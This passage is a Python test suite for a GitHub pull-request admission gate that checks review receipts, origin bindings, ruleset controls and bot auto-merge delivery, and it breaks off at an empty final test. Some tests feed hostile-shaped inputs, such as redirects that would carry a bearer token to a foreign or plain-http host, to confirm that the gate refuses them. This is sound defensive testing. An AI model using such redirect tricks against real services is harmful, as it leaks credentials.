"""Adversarial admission tests; no network, credentials, checkout or API writes."""
import ast
import copy
import datetime as dt
import importlib.util
import json
import shlex
from pathlib import Path
import unittest
from unittest.mock import patch

SPEC = importlib.util.spec_from_file_location('reviewer_app', Path(__file__).resolve().parents[2] / 'scripts/reviewer_app.py')
gate = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(gate)
NOW = dt.datetime(2026, 11, 15, 12, tzinfo=dt.timezone.utc)

def fixture():
    current = dict(repository=gate.REPOSITORY, repository_id=gate.REPOSITORY_ID, head_sha='a'*40,
                   base_sha='b'*40, merge_base_sha='b'*40, diff_sha256='d'*64, policy_sha256='e'*64)
    producer = dict(id='personal-opaque', enabled=True, origin_account='origin-opaque',
                    github_user_id=gate.OWNER_ID, instructions_sha256='f'*64, cli_version='1.0', credential_store='keyring')
    review = dict(verdict='pass', coverage='complete', summary='No findings after full diff review.', findings=[], unresolved_findings=[])
    receipt = dict(schema='g1-local-review/v1', capture_id='00000000-0000-4000-8000-000000000001', trust_model='q16-operational-local',
        tuple=dict(current, origin_account=producer['origin_account']), reviewer_enrollment_id=producer['id'],
        reviewer_origin_account=producer['origin_account'], workspace_binding='owner-declared-enrollment',
        instructions_sha256=producer['instructions_sha256'], runtime=dict(status='completed', thread_id='fresh-thread-id',
        cli_version='1.0', credential_store='keyring', event_stream_sha256='c'*64, turn_id=None, startup_notice_sha256=[]),
        started_at='2026-11-15T11:00:00Z', completed_at='2026-11-15T11:30:00Z', review=review,
        report_sha256=gate.digest(gate.canonical(review)))
    comment = dict(id=1, user=dict(id=gate.OWNER_ID,type='User'), created_at='2026-11-15T11:31:00Z', updated_at='2026-11-15T11:31:00Z', body=gate.MARKER+json.dumps(receipt))
    return current, producer, receipt, comment

class ReceiptTests(unittest.TestCase):
    def setUp(self):
        self.current, self.producer, self.receipt, self.comment = fixture()
    def valid(self):
        gate.validate_receipt(self.receipt, self.producer, self.current, 'e'*64, NOW)
    def test_complete_current_receipt(self):
        self.valid()
    def test_missing_extra_and_wrong_typed_receipt_runtime_fields_refuse(self):
        for group in (None,'runtime','review'):
            original=self.receipt if group is None else self.receipt[group]
            for field in original:
                bad=copy.deepcopy(self.receipt);target=bad if group is None else bad[group];del target[field]
                with self.subTest(group=group,field=field),self.assertRaises(gate.Rejected):gate.validate_receipt(bad,self.producer,self.current,'e'*64,NOW)
            bad=copy.deepcopy(self.receipt);target=bad if group is None else bad[group];target['unexpected']='data'
            with self.assertRaises(gate.Rejected):gate.validate_receipt(bad,self.producer,self.current,'e'*64,NOW)
        for mutate in (lambda r:r.update(capture_id='invalid'),lambda r:r['runtime'].update(turn_id='invented'),lambda r:r['runtime'].update(event_stream_sha256=123)):
            bad=copy.deepcopy(self.receipt);mutate(bad)
            with self.assertRaises(gate.Rejected):gate.validate_receipt(bad,self.producer,self.current,'e'*64,NOW)
    def test_tuple_drift_every_field(self):
        for field in self.current:
            with self.subTest(field=field):
                receipt = copy.deepcopy(self.receipt)
                receipt['tuple'][field] = 'wrong'
                with self.assertRaises(gate.Rejected):
                    gate.validate_receipt(receipt,self.producer,self.current,'e'*64,NOW)
    def test_failed_partial_findings_stale_future_runtime_and_digest(self):
        mutations = [lambda r:r['review'].update(verdict='fail'),lambda r:r['review'].update(coverage='incomplete'),
            lambda r:r['review'].update(findings=[{'id':'P1'}]),lambda r:r['review'].update(unresolved_findings=['P1']),
            lambda r:r.update(started_at='2026-11-13T11:00:00Z'),lambda r:r.update(completed_at='2026-11-16T11:00:00Z'),
            lambda r:r['runtime'].update(status='running'),lambda r:r['runtime'].update(thread_id=''),
            lambda r:r['runtime'].update(credential_store='file'),lambda r:r['runtime'].update(startup_notice_sha256=['0'*64]),lambda r:r.update(report_sha256='0'*64),
            lambda r:r.update(instructions_sha256='0'*64),lambda r:r.update(reviewer_origin_account='other')]
        for mutation in mutations:
            with self.subTest(mutation=mutation):
                r=copy.deepcopy(self.receipt);mutation(r)
                with self.assertRaises(gate.Rejected):gate.validate_receipt(r,self.producer,self.current,'e'*64,NOW)
    def choose(self,comments,producers=None):
        return gate.choose_receipt(comments,{'producers':producers or [self.producer]},self.current,'e'*64,NOW,{'origin_account':self.producer['origin_account']})
    def test_owner_receipt_required_untrusted_sender_cannot_bind(self):
        bad=copy.deepcopy(self.comment);bad['user']['id']=999
        with self.assertRaises(gate.Rejected):self.choose([bad])
        self.assertEqual(self.choose([bad,self.comment]),self.receipt)
    def test_edited_unknown_oversized_receipts_fail_closed(self):
        for change in [dict(updated_at='2026-11-15T12:00:00Z'),dict(body=gate.MARKER+'x'*60000),dict(body=gate.MARKER+'{}')]:
            with self.subTest(change=str(change)[:70]):
                bad=dict(self.comment,**change)
                with self.assertRaises(gate.Rejected):self.choose([bad])
    def test_receipts_cannot_reassign_creation_origin(self):
        other=dict(self.producer,id='other-producer',origin_account='other-origin')
        second=copy.deepcopy(self.receipt);second.update(reviewer_enrollment_id=other['id'],reviewer_origin_account=other['origin_account']);second['tuple']['origin_account']=other['origin_account']
        with self.assertRaisesRegex(gate.Rejected,'frozen PR origin'):
            self.choose([dict(self.comment,id=2,body=gate.MARKER+json.dumps(second))],[self.producer,other])
        with self.assertRaisesRegex(gate.Rejected,'frozen PR origin'):
            self.choose([self.comment,dict(self.comment,id=2,body=gate.MARKER+json.dumps(second))],[self.producer,other])
    def test_duplicate_receipt_keys_at_each_depth_refuse(self):
        for field in ('reviewer_enrollment_id', 'origin_account', 'verdict'):
            original=json.dumps(self.receipt)
            value=self.receipt.get(field, self.receipt['tuple'].get(field, self.receipt['review'].get(field)))
            token=json.dumps(field)+': '+json.dumps(value)
            self.assertEqual(original.count(token),1)
            malformed=original.replace(token,json.dumps(field)+': "conflicting", '+token)
            with self.subTest(field=field),self.assertRaisesRegex(gate.Rejected,'invalid receipt JSON'):
                self.choose([dict(self.comment,body=gate.MARKER+malformed)])
    def test_latest_failed_review_supersedes_old_pass(self):
        failed=copy.deepcopy(self.receipt);failed['review']['verdict']='fail'
        with self.assertRaises(gate.Rejected):self.choose([self.comment,dict(self.comment,id=2,body=gate.MARKER+json.dumps(failed))])

class OriginTests(unittest.TestCase):
    def setUp(self):
        self.producer = dict(id='creator', enabled=True, origin_account='work-origin', github_user_id=gate.OWNER_ID,
            cli_version='1.0', credential_store='keyring', creation_adapter_sha256='a'*64, capture_adapter_sha256='b'*64)
        self.origin = dict(schema='g1-pr-origin/v1', trust_model='q16-operational-local',
            creation_id='00000000-0000-4000-8000-000000000001', repository=gate.REPOSITORY, repository_id=gate.REPOSITORY_ID,
            pull_request=7, pull_request_node_id='PR_7', github_user_id=gate.OWNER_ID, origin_account='work-origin',
            creator_enrollment_id='creator', workspace_binding='owner-declared-enrollment', initial_head_sha='c'*40,
            initial_base_sha='d'*40, pr_created_at='2026-11-15T11:00:01Z', started_at='2026-11-15T11:00:00Z',
            completed_at='2026-11-15T11:00:02Z', runtime=dict(cli_version='1.0', credential_store='keyring',
                account_checked_before=True, account_checked_after=True), creation_adapter_sha256='a'*64, capture_adapter_sha256='b'*64)
        self.pr = dict(number=7,node_id='PR_7',user={'id':gate.OWNER_ID,'type':'User'},created_at=self.origin['pr_created_at'],
            head={'repo':{'id':gate.REPOSITORY_ID}},base={'repo':{'id':gate.REPOSITORY_ID}},
            body='Description\n<!-- g1-pr-creation:'+self.origin['creation_id']+' -->')
        self.comment = dict(id=1,user={'id':gate.OWNER_ID,'type':'User'},created_at='2026-11-15T11:00:03Z',updated_at='2026-11-15T11:00:03Z')
    def choose(self, origin=None, comments=None):
        c=dict(self.comment,body=gate.ORIGIN_MARKER+json.dumps(self.origin if origin is None else origin))
        return gate.choose_origin([c] if comments is None else comments, {'producers':[self.producer]}, self.pr, NOW)
    def test_creation_binding_is_separate_and_survives_new_source_head(self):
        self.assertEqual(self.choose(),self.origin)
        self.pr['head']['sha']='e'*40;self.pr['base']['sha']='f'*40
        self.assertEqual(self.choose(),self.origin)
    def test_no_review_can_supply_missing_creation_binding(self):
        _,_,_,review_comment=fixture()
        for comments in ([],[review_comment]):
            with self.assertRaises(gate.Rejected):self.choose(comments=comments)
    def test_duplicate_edited_foreign_and_wrong_pr_binding_fail(self):
        c=dict(self.comment,body=gate.ORIGIN_MARKER+json.dumps(self.origin))
        for comments in ([c,c],[dict(c,updated_at='2026-11-15T11:02:00Z')],[dict(c,user={'id':999,'type':'User'})]):
            with self.assertRaises(gate.Rejected):self.choose(comments=comments)
        for key,value in [('number',8),('node_id','PR_OTHER'),('created_at','2026-11-15T10:00:00Z'),('body','No creation nonce')]:
            old=self.pr[key];self.pr[key]=value
            with self.assertRaises(gate.Rejected):self.choose()
            self.pr[key]=old
    def test_duplicate_origin_keys_at_each_depth_refuse(self):
        for field, value in [('origin_account', self.origin['origin_account']),
                             ('account_checked_after', True)]:
            original=json.dumps(self.origin);token=json.dumps(field)+': '+json.dumps(value)
            self.assertEqual(original.count(token),1)
            malformed=original.replace(token,json.dumps(field)+': "conflicting", '+token)
            comment=dict(self.comment,body=gate.ORIGIN_MARKER+malformed)
            with self.subTest(field=field),self.assertRaisesRegex(gate.Rejected,'invalid origin JSON'):
                self.choose(comments=[comment])
    def test_closed_schema_account_adapter_and_timing_fail_closed(self):
        for key in self.origin:
            bad=copy.deepcopy(self.origin);del bad[key]
            with self.subTest(missing=key),self.assertRaises(gate.Rejected):self.choose(bad)
        changes=[('origin_account','personal-origin'),('creator_enrollment_id','other'),('creation_adapter_sha256','c'*64),
            ('capture_adapter_sha256','c'*64),('repository_id',True),('pull_request',True),('trust_model','signed'),
            ('initial_head_sha','bad'),('started_at','2026-11-15T10:00:00Z'),('completed_at','2026-11-15T11:20:00Z'),
            ('runtime',dict(self.origin['runtime'],account_checked_after=False))]
        for key,value in changes:
            bad=copy.deepcopy(self.origin);bad[key]=value
            with self.subTest(field=key),self.assertRaises(gate.Rejected):self.choose(bad)
        bad=dict(self.origin,extra='untrusted')
        with self.assertRaises(gate.Rejected):self.choose(bad)

class APIAndControlsTests(unittest.TestCase):
    def test_write_payload_declares_json_content_type(self):
        from unittest.mock import Mock
        response=Mock();response.read.return_value=b'{}'
        response.__enter__=Mock(return_value=response);response.__exit__=Mock(return_value=False)
        with patch.object(gate.urllib.request,'urlopen',side_effect=AssertionError('unexpected network')),patch.object(gate.urllib.request,'build_opener') as builder:
            opened=builder.return_value.open;opened.return_value=response
            gate.API('fixture',writable=True).request('/graphql','POST',{'query':'fixture'})
            self.assertIsInstance(builder.call_args.args[0],gate.NoAPIRedirect)
        request=opened.call_args.args[0]
        self.assertEqual(request.get_header('Content-type'),'application/json')
        self.assertEqual(request.data,b'{"query":"fixture"}')
    def test_api_redirects_cannot_forward_authorization(self):
        request=gate.urllib.request.Request('https://api.github.com/repos/fixed/repo',
            headers={'Authorization':'Bearer fixture-only'})
        handler=gate.NoAPIRedirect()
        for code in (301,302,303,307,308):
            for target in ('https://other.example.invalid/path','https://api.github.com/relocated','http://api.github.com/path'):
                with self.subTest(code=code,target=target),self.assertRaisesRegex(gate.Rejected,'redirect refused'):
                    handler.redirect_request(request,None,code,'redirect',{},target)
    def test_readonly_rejects_post_without_network(self):
        with self.assertRaises(gate.Rejected):gate.API('fake').request('/graphql','POST',{})
    def test_readonly_allows_only_fixed_merge_query(self):
        from unittest.mock import Mock
        response=Mock();response.read.return_value=b'{}'
        response.__enter__=Mock(return_value=response);response.__exit__=Mock(return_value=False)
        api=gate.API('fixture')
        with patch.object(gate.urllib.request,'urlopen',side_effect=AssertionError('unexpected network')),patch.object(gate.urllib.request,'build_opener') as builder:
            opened=builder.return_value.open;opened.return_value=response
            api.request('/graphql','POST',{'query':gate.MERGE_SETTINGS_QUERY})
            self.assertEqual(opened.call_count,1)
            for path,method,data in [('/graphql','POST',{'query':'mutation { unsafe }'}),
                ('/graphql','POST',{'query':gate.MERGE_SETTINGS_QUERY,'variables':{}}),
                ('/repos/other','POST',{'query':gate.MERGE_SETTINGS_QUERY}),
                ('/graphql','PATCH',{'query':gate.MERGE_SETTINGS_QUERY})]:
                with self.assertRaises(gate.Rejected):api.request(path,method,data)
            self.assertEqual(opened.call_count,1)
    def merge_response(self):
        return {'data':{'repository':{'databaseId':gate.REPOSITORY_ID,'nameWithOwner':gate.REPOSITORY,
            'mergeCommitAllowed':False,'rebaseMergeAllowed':False,'squashMergeAllowed':True,'autoMergeAllowed':True}}}
    def test_readonly_redacted_rest_merge_settings_are_validated(self):
        repo,rules,sets=self.controls()
        redacted={k:v for k,v in repo.items() if not k.startswith('allow_')}
        api=gate.API('fixture')
        with patch.object(api,'request',side_effect=[redacted,self.merge_response()]) as request:
            observed=gate.repository_snapshot(api)
        self.assertEqual(observed,repo)
        request.assert_any_call('/graphql','POST',{'query':gate.MERGE_SETTINGS_QUERY})
        gate.validate_controls(observed,rules,sets)
    def test_merge_query_missing_errors_identity_type_drift_and_disagreement_fail(self):
        good=self.merge_response()
        responses=[{}, {'data':None}, {'data':{'repository':None}}, dict(good,errors=[{'message':'denied'}])]
        for field,value in [('databaseId',1),('nameWithOwner','other/repo'),('autoMergeAllowed',None),
                            ('mergeCommitAllowed',0),('squashMergeAllowed','true')]:
            bad=copy.deepcopy(good);bad['data']['repository'][field]=value;responses.append(bad)
        for result in responses:
            with patch.object(gate.API,'request',side_effect=[{},result]):
                with self.assertRaises(gate.Rejected):gate.repository_snapshot(gate.API('fixture'))
        with patch.object(gate.API,'request',side_effect=[{'allow_auto_merge':False},good]):
            with self.assertRaisesRegex(gate.Rejected,'between reads'):gate.repository_snapshot(gate.API('fixture'))
    def test_graphql_merge_setting_still_must_meet_controls(self):
        repo,rules,sets=self.controls()
        redacted={k:v for k,v in repo.items() if not k.startswith('allow_')}
        for field in ('mergeCommitAllowed','rebaseMergeAllowed','squashMergeAllowed','autoMergeAllowed'):
            bad=self.merge_response();bad['data']['repository'][field]=not bad['data']['repository'][field]
            with patch.object(gate.API,'request',side_effect=[dict(redacted),bad]):
                observed=gate.repository_snapshot(gate.API('fixture'))
            with self.assertRaisesRegex(gate.Rejected,'merge methods'):gate.validate_controls(observed,rules,sets)
    def test_pagination_reads_past_first_page(self):
        api=gate.API('fake')
        with patch.object(api,'request',side_effect=[{'jobs':list(range(100))},{'jobs':[100]}]) as request:
            self.assertEqual(len(api.pages('/jobs','jobs')),101)
            self.assertIn('page=2',request.call_args.args[0])
    def test_pagination_never_silently_truncates(self):
        api=gate.API('fake')
        with patch.object(api,'request',return_value=[{}]*100):
            with self.assertRaises(gate.Rejected):api.pages('/things')
    def controls(self):
        repo=dict(id=gate.REPOSITORY_ID,full_name=gate.REPOSITORY,default_branch='main',private=False,
                  allow_squash_merge=True,allow_merge_commit=False,allow_rebase_merge=False,allow_auto_merge=True)
        rules=[dict(type='required_status_checks',ruleset_id=1,parameters=dict(strict_required_status_checks_policy=True,required_status_checks=[dict(context='ci-required',integration_id=15368)])),
               dict(type='pull_request',ruleset_id=1,parameters=dict(required_approving_review_count=1,dismiss_stale_reviews_on_push=True,required_review_thread_resolution=True,allowed_merge_methods=['squash'])),
               dict(type='required_linear_history',ruleset_id=1),dict(type='deletion',ruleset_id=1),dict(type='non_fast_forward',ruleset_id=1)]
        return repo,rules,[dict(id=1,enforcement='active',bypass_actors=[dict(actor_id=5,actor_type='RepositoryRole',bypass_mode='pull_request')])]
    def test_effective_rules_second_page_cannot_hide_an_unexpected_bypass(self):
        repo,rules,sets=self.controls()
        first=[rules[0]]*96 + rules[1:]
        second=[dict(type='non_fast_forward',ruleset_id=2)]
        sets.append(dict(id=2,enforcement='active',bypass_actors=[dict(actor_id=123,actor_type='Integration',bypass_mode='always')]))
        calls=[]
        def request(path):
            calls.append(path)
            if '/rules/branches/main' in path:
                return second if 'page=2' in path else first
            if '/rulesets?' in path:return [{'id':1},{'id':2}]
            if '/rulesets/' in path:return sets[int(path.rsplit('/',1)[1])-1]
            raise AssertionError(path)
        api=gate.API('fixture')
        api.request=request
        with patch.object(gate,'repository_snapshot',return_value=repo), self.assertRaisesRegex(gate.Rejected,'owner bypass exception changed'):
            gate.controls_snapshot(api)
        self.assertTrue(any('/rules/branches/main?' in p and 'page=2' in p for p in calls))
    def test_control_positive(self):gate.validate_controls(*self.controls())
    def test_additional_human_review_gate_is_rejected(self):
        for change in ({'required_approving_review_count': 2}, {'require_code_owner_review': True}, {'required_reviewers': [{'reviewer_id': 42, 'reviewer_type': 'Team'}]}):
            with self.subTest(change=change):
                repo,rules,sets=self.controls()
                rules.append(dict(type='pull_request',ruleset_id=1,parameters=dict(rules[1]['parameters'], **change)))
                with self.assertRaisesRegex(gate.Rejected,'additional reviewer requirement'):
                    gate.validate_controls(repo,rules,sets)

    def test_owner_admin_pr_only_exception_preserved(self):
        repo,rules,sets=self.controls();sets[0]['bypass_actors']=[dict(actor_id=5,actor_type='RepositoryRole',bypass_mode='pull_request')]
        gate.validate_controls(repo,rules,sets)
    def test_app_redacted_bypass_is_not_treated_as_empty(self):
        repo,rules,sets=self.controls();del sets[0]['bypass_actors']
        gate.validate_controls(repo,rules,sets)
    def test_no_protection_gap_or_producer_substitution(self):
        mutations=[lambda r,q,s:r.update(allow_merge_commit=True),lambda r,q,s:q[0]['parameters'].update(strict_required_status_checks_policy=False),
                   lambda r,q,s:q[0]['parameters']['required_status_checks'][0].update(integration_id=4274739),
                   lambda r,q,s:q[1]['parameters'].update(dismiss_stale_reviews_on_push=False),
                   lambda r,q,s:s[0].update(bypass_actors=[{'actor_id':5}]),lambda r,q,s:s[0].update(enforcement='evaluate')]
        for mutation in mutations:
            args=self.controls();mutation(*args)
            with self.assertRaises(gate.Rejected):gate.validate_controls(*args)

class DeliveryTests(unittest.TestCase):
    def setUp(self):
        guard=patch.object(gate,'controls_snapshot',return_value={'controls_sha256':'app-controls','contributing_rulesets':[1],'app_non_bypass':{'1':'never'}})
        self.app_controls=guard.start();self.addCleanup(guard.stop)
    def proof(self):
        return {'tuple':{'head_sha':'a'*40,'base_sha':'b'*40},'node_id':'PR_node','merge_sha':'c'*40,'contributing_rulesets':[1]}
    def live_pr(self, state='blocked'):
        return {'node_id':'PR_node','number':1,'state':'open','merged':False,'draft':False,
                'head':{'sha':'a'*40,'repo':{'id':gate.REPOSITORY_ID}},
                'base':{'sha':'b'*40,'ref':'main','repo':{'id':gate.REPOSITORY_ID}},
                'mergeable':True,'mergeable_state':state,'auto_merge':None}
    def fake_apis(self):
        read=gate.API('fake');write=gate.API('fake',writable=True)
        read.request=lambda path: ({'id':gate.BOT_ID,'type':'Bot','login':gate.APP_SLUG+'[bot]'} if path.startswith('/users/') else
                                  {'object':{'sha':'b'*40}} if path.endswith('/git/ref/heads/main') else self.live_pr())
        write.pages=lambda *args:[{'id':gate.REPOSITORY_ID,'full_name':gate.REPOSITORY}]
        approved={'id':77,'state':'APPROVED','commit_id':'a'*40,
                  'user':{'id':gate.BOT_ID,'type':'Bot','login':gate.APP_SLUG+'[bot]'}}
        read.pages=lambda *args:[approved] if getattr(write.request,'call_count',0) else []
        return read,write
    def test_disabled_means_no_mutation(self):
        read,write=self.fake_apis()
        with patch.object(write,'request') as request:
            with self.assertRaises(gate.Rejected):gate.deliver(read,write,1,{'enabled':False},'hash',NOW,gate.APP_SLUG,'123')
            request.assert_not_called()
    def test_base_race_before_approval_prevents_all_writes(self):
        read,write=self.fake_apis()
        with patch.object(gate,'snapshot',side_effect=[{'base':'old'},{'base':'new'}]),patch.object(write,'request') as request:
            with self.assertRaisesRegex(gate.Rejected,'before approval'):gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            request.assert_not_called()
    def test_base_race_after_approval_never_arms(self):
        read,write=self.fake_apis();proof=self.proof()
        with patch.object(gate,'snapshot',side_effect=[proof,proof,dict(proof,changed=True)]),patch.object(write,'request',return_value={'id':77,'state':'APPROVED','commit_id':'a'*40,'user':{'login':gate.APP_SLUG+'[bot]','id':gate.BOT_ID,'type':'Bot'}}) as request:
            with self.assertRaisesRegex(gate.Rejected,'after approval'):gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            self.assertEqual(request.call_count,1)
            self.assertEqual(request.call_args.args[2]['commit_id'],'a'*40)
    def test_success_writes_exact_head_then_native_squash_only(self):
        read,write=self.fake_apis();proof=self.proof()
        replies=[{'id':77,'state':'APPROVED','commit_id':'a'*40,'user':{'login':gate.APP_SLUG+'[bot]','id':gate.BOT_ID,'type':'Bot'}},
                 {'data':{'enablePullRequestAutoMerge':{'pullRequest':{'autoMergeRequest':{'mergeMethod':'SQUASH','enabledBy':{'login':gate.APP_SLUG+'[bot]'}}}}}}]
        original=read.request
        def observed(path):
            value=original(path)
            if path.endswith('/pulls/1') and request.call_count==2:
                value['auto_merge']={'merge_method':'squash','enabled_by':{'id':gate.BOT_ID,'type':'Bot','login':gate.APP_SLUG+'[bot]'}}
            return value
        read.request=observed
        with patch.object(gate,'snapshot',return_value=proof) as snapshot,patch.object(write,'request',side_effect=replies) as request:
            result=gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            self.assertEqual(result,{'status':'armed','head_sha':'a'*40,'merged':False})
            self.assertEqual(snapshot.call_count,3)
            self.assertTrue(all(call.kwargs.get('require_successor_only') is True for call in snapshot.call_args_list))
            self.assertEqual(request.call_count,2)
            self.assertEqual(request.call_args_list[0].args[2]['commit_id'],'a'*40)
            payload=request.call_args_list[1].args[2]
            self.assertIn('$input:EnablePullRequestAutoMergeInput!',payload['query'])
            self.assertIn('enablePullRequestAutoMerge(input:$input)',payload['query'])
            self.assertEqual(payload['variables'],{'input':{'pullRequestId':'PR_node','expectedHeadOid':'a'*40,'mergeMethod':'SQUASH'}})
    def test_ordinary_write_snapshots_enforce_successor_only_controls(self):
        repo,rules,sets=APIAndControlsTests().controls()
        checks=next(row['parameters']['required_status_checks'] for row in rules if row['type']=='required_status_checks')
        checks.append({'context':'pr-automation / verify','integration_id':4274739})
        pr=self.live_pr();pr['user']={'id':gate.OWNER_ID,'type':'User'}
        read=gate.API('fake')
        def request(path):
            if path.endswith('/pulls/1'):return pr
            if path.endswith('/git/ref/heads/main'):return {'object':{'sha':'b'*40}}
            if path.endswith('/rules/branches/main'):return rules
            if '/rulesets/' in path:return sets[0]
            raise AssertionError('retired control must reject before further admission')
        read.request=request;read.pages=lambda path:(rules if path.endswith('/rules/branches/main') else [{'id':sets[0]['id']}])
        with patch.object(gate,'repository_snapshot',return_value=repo),self.assertRaisesRegex(gate.Rejected,'retired controller blockers'):
            gate.snapshot(read,1,{'enabled':True},'hash',NOW,require_successor_only=True)
        read,write=self.fake_apis()
        with patch.object(gate,'snapshot',side_effect=gate.Rejected('stop at first fresh admission')) as snapshots,patch.object(write,'request') as writes:
            with self.assertRaises(gate.Rejected):gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            self.assertIs(snapshots.call_args.kwargs['require_successor_only'],True)
            writes.assert_not_called()
    def test_overlapping_pull_request_controls_reject(self):
        for count, methods in ((1, ['squash']), (2, ['squash']), (1, ['merge'])):
            repo, rules, sets = APIAndControlsTests().controls()
            extra = dict(type='pull_request', ruleset_id=2, parameters=dict(
                required_approving_review_count=count, dismiss_stale_reviews_on_push=True,
                required_review_thread_resolution=True, allowed_merge_methods=methods))
            rules.append(extra)
            sets.append(dict(id=2, enforcement='active', bypass_actors=[], rules=[extra]))
            with self.subTest(count=count, methods=methods), self.assertRaisesRegex(
                    gate.Rejected, 'additional reviewer requirement'):
                gate.validate_controls(repo, rules, sets)

    def test_new_app_approval_must_remain_current_before_native_delivery(self):
        approved={'id':77,'state':'APPROVED','commit_id':'a'*40,
                  'user':{'id':gate.BOT_ID,'type':'Bot','login':gate.APP_SLUG+'[bot]'}}
        cases = ([], [dict(approved,state='DISMISSED')], [approved, approved],
                 [dict(approved,user={'id':gate.OWNER_ID,'type':'User','login':'KleinPerkins'})])
        for final_rows in cases:
            for stage in ('after-submit', 'before-native'):
                read,write=self.fake_apis()
                reads=[[],final_rows] if stage=='after-submit' else [[],[approved],final_rows]
                with self.subTest(stage=stage,rows=final_rows), patch.object(read,'pages',side_effect=reads), \
                     patch.object(gate,'snapshot',return_value=self.proof()), \
                     patch.object(write,'request',return_value=approved) as writes:
                    with self.assertRaises(gate.Rejected):
                        gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
                    self.assertEqual(writes.call_count,1)
                    self.assertTrue(writes.call_args.args[0].endswith('/reviews'))

    def test_more_than_one_required_approval_is_not_qualified(self):
        for count in (0,2,3):
            repo,rules,sets=APIAndControlsTests().controls()
            next(row['parameters'] for row in rules if row['type']=='pull_request')['required_approving_review_count']=count
            with self.subTest(count=count),self.assertRaisesRegex(gate.Rejected,'additional reviewer requirement|review controls missing'):
                gate.validate_controls(repo,rules,sets)

    def test_actual_writer_checks_repeat_before_approval_and_native_operation(self):
        read,write,writes=self.clean_apis()
        with patch.object(gate,'snapshot',return_value=self.proof()):
            gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
        self.assertEqual(self.app_controls.call_count,2)
        self.assertTrue(all(call.args==(write,) for call in self.app_controls.call_args_list))
        self.assertTrue(all(call.kwargs=={'require_successor_only':True,'require_app_non_bypass':True}
                            for call in self.app_controls.call_args_list))
        self.assertEqual(len(writes),2)
    def test_app_status_failure_or_incomplete_coverage_prevents_approval(self):
        for failure in (gate.Rejected('App bypass status is unknown or permits bypass'),
                        {'contributing_rulesets':[1,2]}):
            read,write=self.fake_apis()
            self.app_controls.reset_mock()
            self.app_controls.side_effect=failure if isinstance(failure,Exception) else None
            self.app_controls.return_value=failure
            with patch.object(gate,'snapshot',return_value=self.proof()),patch.object(write,'request') as writes:
                with self.assertRaises(gate.Rejected):
                    gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
                writes.assert_not_called()
    def test_app_status_change_after_approval_prevents_native_write(self):
        baseline={'controls_sha256':'old','contributing_rulesets':[1],'app_non_bypass':{'1':'never'}}
        for changed in (gate.Rejected('App bypass status is unknown or permits bypass'),
                        dict(baseline,controls_sha256='changed',contributing_rulesets=[1,2])):
            read,write,writes=self.clean_apis()
            self.app_controls.side_effect=[baseline,changed]
            with patch.object(gate,'snapshot',return_value=self.proof()),self.assertRaises(gate.Rejected):
                gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            self.assertEqual(len(writes),1,'no native mutation may follow changed/unknown App status')

    def test_lost_approval_response_reuses_current_app_review_without_duplicate_post(self):
        read,write=self.fake_apis();proof=self.proof();writes=[];original=read.request
        current={'id':77,'commit_id':'a'*40,'state':'APPROVED',
                 'user':{'id':gate.BOT_ID,'type':'Bot','login':gate.APP_SLUG+'[bot]'}}
        read.pages=lambda *args:[current]
        def mutate(path,method,data):
            writes.append((path,method,data))
            self.assertEqual(path,'/graphql','reconciled approval must not be posted again')
            return {'data':{'enablePullRequestAutoMerge':{'pullRequest':{'autoMergeRequest':{'mergeMethod':'SQUASH','enabledBy':{'login':gate.APP_SLUG+'[bot]'}}}}}}
        def observed(path):
            value=original(path)
            if path.endswith('/pulls/1') and writes:
                value['auto_merge']={'merge_method':'squash','enabled_by':{'id':gate.BOT_ID,'type':'Bot','login':gate.APP_SLUG+'[bot]'}}
            return value
        read.request=observed;write.request=mutate
        with patch.object(gate,'snapshot',return_value=proof) as snapshots:
            self.assertEqual(gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')['status'],'armed')
        self.assertEqual(snapshots.call_count,3,'prior approval does not replace fresh complete admission')
        self.assertEqual(len(writes),1)
    def test_existing_app_review_unknown_or_changed_state_fails_without_approval_retry(self):
        approved={'id':77,'commit_id':'a'*40,'state':'APPROVED',
                  'user':{'id':gate.BOT_ID,'type':'Bot','login':gate.APP_SLUG+'[bot]'}}
        for state in ('PENDING','DISMISSED','CHANGES_REQUESTED','COMMENTED',None):
            read,write=self.fake_apis();read.pages=lambda *args:[dict(approved,state=state)]
            with patch.object(gate,'snapshot',return_value=self.proof()),patch.object(write,'request') as request:
                with self.assertRaisesRegex(gate.Rejected,'existing App review'):
                    gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
                request.assert_not_called()
        read,write=self.fake_apis();read.pages=lambda *args:[approved,approved]
        with patch.object(gate,'snapshot',return_value=self.proof()),patch.object(write,'request') as request:
            with self.assertRaisesRegex(gate.Rejected,'multiple existing App reviews'):
                gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            request.assert_not_called()
        read,write=self.fake_apis()
        with patch.object(read,'pages',side_effect=[[approved],[]]),patch.object(gate,'snapshot',return_value=self.proof()),patch.object(write,'request') as request:
            with self.assertRaisesRegex(gate.Rejected,'existing App approval changed'):
                gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
            request.assert_not_called()

    def test_preexisting_or_unknown_auto_merge_blocks_before_approval(self):
        for value in (None, {}, {'merge_method':'squash','enabled_by':{'id':gate.OWNER_ID}},
                      {'merge_method':'squash','enabled_by':{'id':gate.BOT_ID}}):
            read,write=self.fake_apis();original=read.request
            def observed(path):
                pr=original(path)
                if path.endswith('/pulls/1'):
                    if value is None:pr.pop('auto_merge')
                    else:pr['auto_merge']=value
                return pr
            read.request=observed
            with patch.object(gate,'snapshot',return_value=self.proof()),patch.object(write,'request') as request:
                with self.assertRaisesRegex(gate.Rejected,'existing or unknown native auto-merge'):
                    gate.deliver(read,write,1,{'enabled':True},'hash',NOW,gate.APP_SLUG,'123')
                request.assert_not_called()
    def test_auto_merge_actor_and_readback_state_must_match(self):
